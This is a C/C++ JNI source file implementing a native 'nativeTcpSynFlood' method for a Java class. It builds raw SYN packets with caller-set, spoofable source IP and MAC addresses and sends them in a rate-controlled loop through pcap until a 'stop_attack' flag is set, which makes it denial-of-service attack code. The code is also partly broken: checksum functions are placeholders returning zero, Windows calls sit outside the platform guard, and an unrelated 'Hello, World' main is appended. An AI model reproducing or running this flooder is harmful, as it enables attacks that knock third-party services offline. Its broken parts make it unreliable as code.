#include <jni.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include "com_yourpackage_Jenkins.h"
#include <iphlpapi.h>
#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Packet.lib")

// Define Windows-specific structures and functions
#define PACKET_SIZE 4096

// Define IP header structure for Windows
struct iphdr {
    unsigned char  ihl:4, version:4;
    unsigned char  tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char  ttl;
    unsigned char  protocol;
    unsigned short check;
    unsigned int   saddr;
    unsigned int   daddr;
};

// Define TCP header structure for Windows
struct tcphdr {
    unsigned short source;
    unsigned short dest;
    unsigned int   seq;
    unsigned int   ack_seq;
    unsigned short res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, res2:2;
    unsigned short window;
    unsigned short check;
    unsigned short urg_ptr;
};

// Example checksum function for Windows
unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    // Implement checksum calculation
    return 0; // Placeholder
}

// Example TCP checksum function for Windows
unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    // Implement TCP checksum calculation
    return 0; // Placeholder
}

#else
#include <netinet/ip.h>    // For iphdr
#include <netinet/tcp.h>   // For tcphdr
#include <netinet/ether.h> // For ethhdr
#include <arpa/inet.h>     // For inet_addr
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

// Define Unix-specific structures and functions
#define PACKET_SIZE 4096

// Example checksum function for Unix
unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

// Example TCP checksum function for Unix
unsigned short tcp_checksum(struct iphdr *iph, struct tcphdr *tcph) {
    // Implement TCP checksum calculation
    return 0; // Placeholder
}

#endif

#include <cstdlib>         // For rand()
#include <cstring>         // For memset()
#include <iostream>        // For std::cout and std::endl

// Define the Ethernet header
#pragma pack(push, 1) // Set alignment to 1 byte
struct ethhdr {
    unsigned char dest_mac[6];
    unsigned char src_mac[6];
    unsigned short ethertype;
};
#pragma pack(pop) // Restore previous alignment

// Existing pseudo_header and other structures ...

struct thread_data {
    const char* source_ip;
    const char* source_mac;
    const char* dest_ip;
    const char* dest_mac;
    int dest_port;
    long bytes_per_second;
    volatile bool* stop_attack;
};

// Update send_syn_packets to include Ethernet header
DWORD WINAPI send_syn_packets(LPVOID arg) {
    struct thread_data *data = (struct thread_data *)arg;
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    
    // Select the correct network interface based on source IP
    // For simplicity, you might allow selecting the interface via UI or configuration
    // Here, we'll use the first available device. Adjust as needed.
    pcap_if_t *alldevs;
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return 1;
    }
    if (alldevs == NULL) {
        fprintf(stderr, "No interfaces found!\n");
        return 1;
    }
    // Open the first device. You may need to select appropriately.
    handle = pcap_open_live(alldevs->name, 65536, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", alldevs->name, errbuf);
        pcap_freealldevs(alldevs);
        return 1;
    }
    pcap_freealldevs(alldevs);

    char packet[PACKET_SIZE];
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct iphdr *ip = (struct iphdr *)(packet + sizeof(struct ethhdr));
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct ethhdr) + sizeof(struct iphdr));

    // Fill in the Ethernet header
    sscanf(data->source_mac, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
           &eth->src_mac[0],
           &eth->src_mac[1],
           &eth->src_mac[2],
           &eth->src_mac[3],
           &eth->src_mac[4],
           &eth->src_mac[5]);

    sscanf(data->dest_mac, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
           &eth->dest_mac[0],
           &eth->dest_mac[1],
           &eth->dest_mac[2],
           &eth->dest_mac[3],
           &eth->dest_mac[4],
           &eth->dest_mac[5]);

    eth->ethertype = htons(0x0800); // IP Protocol

    // Fill in the IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = inet_addr(data->source_ip);
    ip->daddr = inet_addr(data->dest_ip);
    ip->check = 0;
    ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

    // Fill in the TCP header
    tcp->source = htons(rand() % 65535);
    tcp->dest = htons(data->dest_port);
    tcp->seq = htonl(rand() % 4294967295);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(5840);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    // Calculate TCP checksum
    tcp->check = tcp_checksum(ip, tcp);

    LARGE_INTEGER frequency, start_time, current_time;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&start_time);

    double packets_per_second = (double)data->bytes_per_second / PACKET_SIZE;
    double interval = 1.0 / packets_per_second;

    while (!*(data->stop_attack)) {
        // Update IP and TCP headers for each packet
        ip->id = htons(rand() % 65535);
        tcp->source = htons(rand() % 65535);
        tcp->seq = htonl(rand() % 4294967295);

        // Recalculate checksums
        ip->check = 0;
        ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

        tcp->check = 0;
        tcp->check = tcp_checksum(ip, tcp);

        // Send the packet
        if (pcap_sendpacket(handle, (u_char*)packet, sizeof(packet)) != 0) {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        }

        // Rate limiting
        QueryPerformanceCounter(&current_time);
        double elapsed = (double)(current_time.QuadPart - start_time.QuadPart) / frequency.QuadPart;
        if (elapsed < interval) {
            DWORD sleep_time = (DWORD)((interval - elapsed) * 1000);
            if (sleep_time > 0) {
                Sleep(sleep_time);
            }
        }
        start_time = current_time;
    }

    pcap_close(handle);
    return 0;
}

// JNI Implementation
JNIEXPORT jboolean JNICALL Java_com_yourpackage_Jenkins_nativeTcpSynFlood
  (JNIEnv *env, jobject obj, jstring sourceIp, jstring sourceMac, jstring destIp, jstring destMac, jint destPort, jlong bytesPerSecond) {
    const char *cSourceIp = env->GetStringUTFChars(sourceIp, NULL);
    const char *cSourceMac = env->GetStringUTFChars(sourceMac, NULL);
    const char *cDestIp = env->GetStringUTFChars(destIp, NULL);
    const char *cDestMac = env->GetStringUTFChars(destMac, NULL);

    struct thread_data data;
    data.source_ip = cSourceIp;
    data.source_mac = cSourceMac;
    data.dest_ip = cDestIp;
    data.dest_mac = cDestMac;
    data.dest_port = destPort;
    data.bytes_per_second = bytesPerSecond;
    
    bool stop_attack = false;
    data.stop_attack = &stop_attack;

    HANDLE thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
    if (thread == NULL) {
        env->ReleaseStringUTFChars(sourceIp, cSourceIp);
        env->ReleaseStringUTFChars(sourceMac, cSourceMac);
        env->ReleaseStringUTFChars(destIp, cDestIp);
        env->ReleaseStringUTFChars(destMac, cDestMac);
        return JNI_FALSE;
    }

    // Store the thread handle if you need to stop it later
    // For simplicity, we'll wait here
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);

    env->ReleaseStringUTFChars(sourceIp, cSourceIp);
    env->ReleaseStringUTFChars(sourceMac, cSourceMac);
    env->ReleaseStringUTFChars(destIp, cDestIp);
    env->ReleaseStringUTFChars(destMac, cDestMac);
    return JNI_TRUE;
}

int main() {
    std::cout << "Hello, World!" << std::endl;
    return 0;
}